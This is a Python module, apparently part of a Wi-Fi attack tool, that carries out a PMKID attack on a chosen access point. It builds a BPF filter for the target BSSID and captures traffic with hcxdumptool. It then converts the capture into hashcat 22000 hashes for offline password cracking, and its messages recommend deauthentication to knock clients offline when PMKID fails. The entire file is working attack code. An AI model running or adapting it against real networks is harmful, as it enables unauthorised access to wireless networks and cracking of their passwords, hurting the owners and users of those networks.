"""
PMKID 攻击
不需要客户端在线，因此是deauth的前置步骤。deauth作为保底
"""

from dataclasses import dataclass
import os
import re
import subprocess
import sys
import tempfile
import time
from typing import Dict, List, Optional, Tuple

from .deauth import validate_bssid
from wifi_infra.errors import WifiHackingToolError
from wifi_infra.iface import set_managed_mode
from wifi_infra.runner import OutResult, run_command, start_process
from wifi_infra.utils import require_linux

BAND_2G = "2.4G"
BAND_5G = "5G"

_BAND_SUFFIX = {BAND_2G: "a", BAND_5G: "b"}
_WPA_LINE_RE = re.compile(r"^WPA\*(\d{2})\*")
_SUMMARY_RE = re.compile(r"^(?P<key>[A-Za-z][^:]*?)\.*\s*:\s*(?P<value>.*)$")
_CAPTURED_RE = re.compile(r"(\d+)\s+Packet\(s\)\s+captured by kernel")

@dataclass
class PmkidResults:
    bssid: str
    channel: int
    pcapng_path: Optional[str] # 原始捕获
    hash_path: Optional[str] # 22000文件
    pmkid_counts: int
    eapol_counts: int
    message: str

    def got_pmkid(self) -> bool:
        return self.pmkid_counts > 0
    
    def got_hash(self) -> bool:
        """
        有没有任何可爆破的 hash —— 决定退出码
        """
        return self.pmkid_counts + self.eapol_counts > 0


def build_bpf_expr(bssid: str) -> str:
    """构造如: wlan addr3 5c27d4e74e46"""
    from wifi_infra.parse import _looks_like_mac
    if not bssid or not _looks_like_mac(bssid):
        raise WifiHackingToolError(f"无效的BSSID: {bssid}, 或者 BSSID 不存在", 2)

    return f"wlan addr3 " + bssid.replace(":", "").replace("-", "").lower()


def _write_bpf(bpf_path: str, bssid: str):
    """编写过滤器规则, 只留 addr3 == 目标 AP 的帧
    hcxdumptool --bpfc="wlan addr3 5c27d4e74e46" > filter.bpf
    """
    expr = build_bpf_expr(bssid)
    result = run_command(["hcxdumptool", f"--bpfc={expr}"], timeout=10)
    bpf_content = (result.stdout or "").strip()
    if result.outResult != OutResult.OK or not bpf_content:
        raise WifiHackingToolError(
            f"BPF 过滤器编译失败：{expr!r}\n"
            f"  返回状态：{result.outResult}\n"
            f"  原始输出：{(result.stdout or '') + (result.stderr or '')}",
            return_code=1,
        )
    with open(bpf_path, "w", encoding="utf-8") as f:
        f.write(bpf_content + "\n")

    print(
        f"[PMKID] 过滤器已编译：{bpf_path}（{len(bpf_content.splitlines())} 条指令）",
        file=sys.stderr,
    )

def _get_band(channel: int) -> str:
    """ 获取 channel 对应的频段 """
    if 1 <= channel <= 14:
        return BAND_2G
    elif 32 <= channel <= 177:
        return BAND_5G
    raise WifiHackingToolError(
        f"信道 {channel} 无法判断频段（2.4G: 1-14 / 5G: 32-177）\n"
        f"  → 6GHz 的信道号与这两个范围重叠，无法靠信道号区分\n",
        return_code=2,
    )


def channel_to_hcxdumptool(channel: int) -> str:
    """hcxdumptool 的频道参数"""
    if not isinstance(channel, int) or isinstance(channel, bool):
        raise WifiHackingToolError(
            f"channel 必须是整数，收到 {type(channel).__name__}: {channel!r}",
            return_code=2,
        )
    band = _get_band(channel)
    return f"{channel}{_BAND_SUFFIX[band]}"

def convert_pcapng_to_22000(pcapng_path: str, hash_path: str) -> str:
    """
    将 pcapng 转为 22000 格式
    hcxpcapngtool --all -o /tmp/test.22000 /tmp/test.pcapng
    """
    convert_argv = ["hcxpcapngtool", "--all", "-o", hash_path, pcapng_path]
    result = run_command(convert_argv, timeout=120)

    if result.outResult == OutResult.NOTFOUND:
        raise WifiHackingToolError(
            "[工具缺失] 找不到 hcxpcapngtool，请先安装：apt install hcxtools",
            return_code=3,
        )
    
    if result.outResult != OutResult.OK and not os.path.exists(hash_path):
        raise WifiHackingToolError(
            f"转换 pcapng 到 22000 格式失败：{pcapng_path}\n"
            f"  返回状态：{result.outResult}\n"
            f"  原始输出：{(result.stdout or '') + (result.stderr or '')}",
            return_code=1,
        )
    """
    22000结果大致如下：
    WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***
    WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*NONCE_CLIENT*EAPOL**MESSAGEPAIR
    """
    return (result.stdout or "") + "\n" + (result.stderr or "")


def _run_hcxdumptool(iface: str, channel: int, duration: int, pcapng_path: str, bpf_path: str, log_path: str) -> None:
    """
    hcxdumptool -i wlan0 -c 6a --bpf=filter.bpf -w out.pcapng

    log:
    181 Packet(s) captured by kernel
    0 Packet(s) dropped by kernel
    exit on sigterm
    """
    channel = channel_to_hcxdumptool(channel)
    argv = ['hcxdumptool', '-i', iface, '-c', channel, '--bpf=' + bpf_path, '-w', pcapng_path]
    with open(log_path, "w", encoding="utf-8", errors="replace") as log_file:
        handler = start_process(argv,stdout=log_file, stderr=subprocess.STDOUT)
        if handler.proc is None:
            raise WifiHackingToolError(f"启动 hcxdumptool 失败: {handler.error}", return_code=3)
        try:
            time.sleep(duration)
        finally:
            handler.terminate()

    if not os.path.exists(pcapng_path):
        raise WifiHackingToolError(
            f"hcxdumptool 没有生成 pcapng（{pcapng_path}）\n"
            f"  日志：{log_path}\n"
            f"  → 查射频：读两次 /sys/class/net/{iface}/statistics/rx_packets，不涨就是网卡没收帧",
            return_code=1,
        )

def parse_22000(text: str) -> tuple[int, int]:
    """
    解析 22000 格式的内容，返回 pmkid 数量和 eapol 数量
    """
    pmkid_counts = 0
    eapol_counts = 0
    for line in text.splitlines():
        m = _WPA_LINE_RE.match(line)
        if not m:
            continue
        kind = m.group(1)
        if kind == "01":
            pmkid_counts += 1
        elif kind == "02":
            eapol_counts += 1

    return pmkid_counts, eapol_counts


def parse_hcxpcapngtool_summary(text: str) -> Dict[str, str]:
    """
    text 样例, hcxpcapngtool 的输出：
    EAPOL M1 messages (total)................: 169
    RSN PMKID (useless)......................: 169
    Information: no hashes ... 
    """
    out: Dict[str, str] = {}
    for line in text.splitlines():
        stripped_line = line.strip()
        if not stripped_line or ":" not in stripped_line:
            continue
        if stripped_line.startswith("Information:"):
            continue
        m = _SUMMARY_RE.match(stripped_line)
        if not m:
            continue
        key = m.group("key").strip()
        if key:
            out[key] = m.group("value").strip()

    return out

def _summary_int(summary_result: Dict[str, str], key: str, default: int = 0) -> int:
    """安全获取整数值"""
    raw = summary_result.get(key, "")
    try:
        return int(str(raw).strip())
    except (TypeError, ValueError):
        return default

def classify_pmkid_error(pmkid_counts: int, eapol_counts: int, summary_result: Dict[str, str]) -> Tuple[str, str]:
    """
    区分错误类型
    """
    # 成功拿到 pmkid
    if pmkid_counts > 0:
        return ("ok", f"拿到 {pmkid_counts} 条 PMKID, 可以直接交给后续爆破")

    # 没拿到pmkid, 但拿到了eapol
    if eapol_counts > 0:
        return (
            "ok-eapol",
            f"没有拿到 PMKID，但拿到了 {eapol_counts} 条 EAPOL 握手.\n"
            f"握手包同样可以爆破, 可以继续推进"
        )

    useless = _summary_int(summary_result, "RSN PMKID (useless)")

    if useless > 0:
        return (
            "zero-pmkid",
            f"AP 返回了 {useless} 个 PMKID 字段，但全部无效（实测多为全零）。\n"
            f"  全零 PMKID 是占位符，任何密码算出来都是它，无法爆破。\n"
            f"  → 这个 AP 上 PMKID 攻击【永远】不会成功。\n"
            f"  → 改用 deauth(capture --deauth)来踢人下线",
        )

    total = _summary_int(summary_result, "EAPOL M1 messages (total)")
    if total > 0:
        return (
            "no-pmkid-kde",
            f"AP 回了 {total} 个 EAPOL M1，但没有携带 PMKID（不实现该可选字段）。\n"
            f"  → 换一个 AP 试，或改用deauth",
        )

    return (
        "no-m1",
        "连 EAPOL M1 都没收到 —— 关联可能没成功。\n"
        "  → 查射频：隔 3 秒读两次 /sys/class/net/<iface>/statistics/rx_packets，不涨就是网卡没收帧\n"
        "  → 查信道：--channel 是否写对（hcxdumptool 的 -c 要带频段后缀）\n"
        "  → 查模式：网卡是否在 monitor",
    )

def parse_captured_count(text: str) -> Optional[int]:
    m = _CAPTURED_RE.search(text or "")
    return int(m.group(1)) if m else None


def _read_mac(iface: str) -> Optional[str]:
    try:
        with open(f"/sys/class/net/{iface}/address", "r", encoding="utf-8") as f:
            return f.read().strip()
    except OSError:
        return None

def _restore_mac(iface: str, original_mac: Optional[str]) -> None:
    if not original_mac:
        return
    current_mac = _read_mac(iface)
    if current_mac and current_mac.lower() == original_mac.lower():
        return
    
    run_command(["ip", "link", "set", iface, "down"], timeout=5)
    result = run_command(["ip", "link", "set", iface, "address", original_mac], timeout=5)
    run_command(["ip", "link", "set", iface, "up"], timeout=5)

    if result.outResult != OutResult.OK:
        print(
            f"[警告] MAC 没能恢复成 {original_mac}（现在是 {_read_mac(iface)}）\n"
            f"       影响：做过 MAC 白名单的网络可能连不上；重启即可恢复",
            file=sys.stderr,
        )
    else:
        print(f"[PMKID] 已把 {iface} 的 MAC 恢复成 {original_mac}", file=sys.stderr)



def pmkid_command(
    bssid: str,  # 目标网络的BSSID（MAC地址）
    iface: str,  # 使用的网络接口
    duration: int = 60,
    channel: Optional[int] = None,
    output_dir: Optional[str] = None
) -> PmkidResults:
    bssid = validate_bssid(bssid)
    require_linux("hcxdumptool")

    if output_dir is None:
        output_dir = tempfile.mkdtemp(prefix="WifiHackingTool-pmkid-")

    os.makedirs(output_dir, exist_ok=True)
    print(f"[PMKID 输出目录]: {output_dir}", file=sys.stderr)

    if channel is None:
        from .capture_handshake_packet import findChannel
        channel = findChannel(bssid, iface)

    pcapng_path = os.path.join(output_dir, "pmkid.pcapng")
    hash_path = os.path.join(output_dir, "pmkid.22000")
    bpf_path = os.path.join(output_dir, "filter.bpf")
    log_path = os.path.join(output_dir, "hcxdumptool.log")

    # ① 编译过滤器：只留 addr3 == 目标 AP 的帧
    _write_bpf(bpf_path, bssid)

    print(f"[PMKID] {bssid} 频道 {channel}，开始捕获 PMKID，持续 {duration} 秒...", file=sys.stderr)

    # 存原始 mac 地址，用于最后恢复
    original_mac = _read_mac(iface)

    # 抓 pcapng 包
    try:
        _run_hcxdumptool(iface, channel, duration, pcapng_path, bpf_path, log_path)
    finally:
        try:
            set_managed_mode(iface)
        except Exception as e:
            print(f"切回网卡模式至 managed 失败: {e}", file=sys.stderr)
            print(f"请手动执行: ip link set {iface} down && iw dev {iface} set type managed && ip link set {iface} up", file=sys.stderr)

        try:
            _restore_mac(iface, original_mac)
        except Exception as e:
            print(f"恢复网卡 MAC 失败: {e}", file=sys.stderr)


    # 转换 pcapng 到 22000 格式
    result_text = convert_pcapng_to_22000(pcapng_path, hash_path)

    pmkid_counts = 0
    eapol_counts = 0
    if os.path.exists(hash_path):
        with open(hash_path, "r", encoding="utf-8") as f:
            pmkid_counts, eapol_counts = parse_22000(f.read())

    captured = None
    if os.path.exists(log_path):
        with open(log_path, encoding="utf-8", errors="replace") as f:
            captured = parse_captured_count(f.read())

    if captured == 0:
        message = (
            "hcxdumptool 一帧都没收到(captured = 0)\n"
            f"  → 网卡没在收帧：读两次 /sys/class/net/{iface}/statistics/rx_packets，不涨就是射频死了\n"
            f"  → 或信道不对：确认 --channel {channel} 和目标 AP 一致\n"
            f"  → 日志：{log_path}"
        )
    else:
        summary_result = parse_hcxpcapngtool_summary(result_text)
        _code, message = classify_pmkid_error(pmkid_counts, eapol_counts, summary_result)
        if captured is not None:
            message += f"\n  （本次 hcxdumptool 收到 {captured} 个包）"
 
    return PmkidResults(
        bssid=bssid,
        channel=channel,
        pcapng_path=pcapng_path if os.path.exists(pcapng_path) else None,
        hash_path=hash_path if (pmkid_counts + eapol_counts) > 0 else None,
        pmkid_counts=pmkid_counts,
        eapol_counts=eapol_counts,
        message=message
    )


